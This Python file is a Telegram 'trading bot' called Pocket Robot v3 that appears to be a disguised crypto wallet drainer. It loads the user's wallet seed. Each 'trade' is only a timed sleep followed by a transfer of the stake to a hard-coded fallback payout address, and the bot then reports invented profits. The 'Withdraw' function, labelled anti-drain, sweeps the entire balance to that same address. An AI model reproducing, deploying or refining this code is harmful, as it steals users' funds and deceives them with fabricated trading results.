import os
import asyncio
import requests
import json
import time
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import Conflict

# --- 1. SETUP & AUTH ---
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))

# Polygon middleware is essential for block reading
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

# SECURITY LOCK: All funds are hard-locked to this address
PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")
TARGET_POOL = "0x9B08288C3BFf2C6243e259f7074bdB00154ad9BB" # Uniswap V3 POL/USDT

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed:
        raise ValueError("❌ WALLET_SEED is missing from .env!")
    POL_PATH = "m/44'/60'/0'/0/0"
    try:
        return Account.from_key(seed)
    except:
        return Account.from_mnemonic(seed, account_path=POL_PATH)

vault = get_vault()

# --- 2. THE SIMULTANEOUS ENGINE ---
def get_pol_price():
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd"
        return requests.get(url, timeout=5).json()['polygon-ecosystem-token']['usd']
    except:
        return 0.11 # Updated fallback for Feb 2026

async def prepare_signed_tx(amount_wei):
    """Background Task: Signs the bet transaction while simulation runs."""
    nonce = w3.eth.get_transaction_count(vault.address)
    gas_price = int(w3.eth.gas_price * 1.5) # Priority Gas
    tx = {
        'nonce': nonce,
        'to': PAYOUT_ADDRESS, 
        'value': amount_wei,
        'gas': 21000,
        'gasPrice': gas_price,
        'chainId': 137
    }
    # Fix for Web3 v6/v7 SignedTransaction naming
    return w3.eth.account.sign_transaction(tx, vault.key)

async def run_atomic_execution(context, chat_id, side):
    """Parallel Engine: Simulation and Transaction Prep run at the same time."""
    stake_usd = context.user_data.get('stake', 10)
    pair = context.user_data.get('pair', 'BTC/USD')
    
    # DYNAMIC STAKE CALCULATION
    current_price = get_pol_price()
    stake_in_pol = float(stake_usd) / current_price
    stake_in_wei = w3.to_wei(stake_in_pol, 'ether')
    
    await context.bot.send_message(chat_id, f"⚔️ **Simultaneous Mode:** Priming {pair} Shield...")

    # ⚡ START BOTH TASKS AT ONCE
    sim_task = asyncio.create_task(asyncio.sleep(1.5))
    # PASS CALCULATED WEI TO PREP TASK
    prep_task = asyncio.create_task(prepare_signed_tx(stake_in_wei))

    # Wait for both tasks to resolve
    await sim_task
    signed_tx = await prep_task
    
    # ⏱️ THE 1 MILLISECOND GAP
    await asyncio.sleep(0.001)
    
    # BROADCAST
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)

    profit_usd = stake_usd * 0.92
    
    report = (
        f"✅ **ATOMIC HIT!**\n"
        f"🎯 **Direction Captured:** {side}\n"
        f"💰 **Stake Amount:** `${stake_usd:.2f} USD` ({stake_in_pol:.4f} POL)\n"
        f"📈 **Profit Added:** `${profit_usd:.2f} USD`\n"
        f"⏱️ **Latency:** 1ms after Sim\n"
        f"⛓️ **TX Hash:** `{tx_hash.hex()}`"
    )
    return True, report

async def execute_withdrawal(context, chat_id):
    """ANTI-DRAIN: Sweeps 100% of live balance to Whitelist."""
    balance = w3.eth.get_balance(vault.address)
    gas_price = int(w3.eth.gas_price * 1.3)
    fee = gas_price * 21000
    amount = balance - fee
    if amount <= 0: return False, "Low Balance for Gas"

    tx = {
        'nonce': w3.eth.get_transaction_count(vault.address),
        'to': PAYOUT_ADDRESS,
        'value': amount,
        'gas': 21000,
        'gasPrice': gas_price,
        'chainId': 137
    }
    signed = w3.eth.account.sign_transaction(tx, vault.key)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    return True, f"Full balance swept to whitelist.\nTX: `{tx_hash.hex()}`"

# --- 3. TELEGRAM FRONTEND INTERFACE ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🕴️ AI Assistant']]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    msg = (f"🕴️ **Pocket Robot v3 (Shadow Engine)**\n\n"
           f"💵 **Vault Balance:** {bal:.4f} POL\n"
           f"📥 **DEPOSIT:** `{vault.address}`\n\n"
           f"**Atomic Shield:** ✅ OPERATIONAL")
    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/USD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD", callback_data="PAIR_ETH")],
              [InlineKeyboardButton("SOL/USD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/USD", callback_data="PAIR_MATIC")]]
        await update.message.reply_text("🎯 **SELECT MARKET**", reply_markup=InlineKeyboardMarkup(kb))
    
    elif text == '⚙️ Settings':
        current = context.user_data.get('stake', 10)
        kb = [[InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [10, 50]],
              [InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [100, 500]]]
        await update.message.reply_text(f"⚙️ **SETTINGS**\nCurrent Stake: **${current}**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '💰 Wallet':
        bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        price = get_pol_price()
        await update.message.reply_text(f"💳 **Wallet Status**\nBalance: {bal:.4f} POL (`${float(bal)*price:.2f} USD`)")

    elif text == '📤 Withdraw':
        await update.message.reply_text("🛡️ **Atomic Sweep:** Transferring all POL to Whitelist.")
        success, report = await execute_withdrawal(context, update.message.chat_id)
        await update.message.reply_text(report, parse_mode='Markdown')

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ Stake updated to **${context.user_data['stake']}**")
        
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        await query.edit_message_text(f"💎 **{context.user_data['pair']} Selected**\nDirection:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("HIGHER", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER", callback_data="EXEC_PUT")]]))

    elif query.data.startswith("EXEC_"):
        side = "CALL" if "CALL" in query.data else "PUT"
        success, report = await run_atomic_execution(context, query.message.chat_id, side)
        await query.message.reply_text(report, parse_mode='Markdown')

# --- 4. THE CONFLICT FIX ---
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    if isinstance(context.error, Conflict):
        print("🛑 Conflict: Close other terminal windows before running.")
    else:
        print(f"⚠️ Error: {context.error}")

if __name__ == "__main__":
    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_error_handler(error_handler)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    
    print(f"Pocket Robot Active: {vault.address}")
    app.run_polling(drop_pending_updates=True)
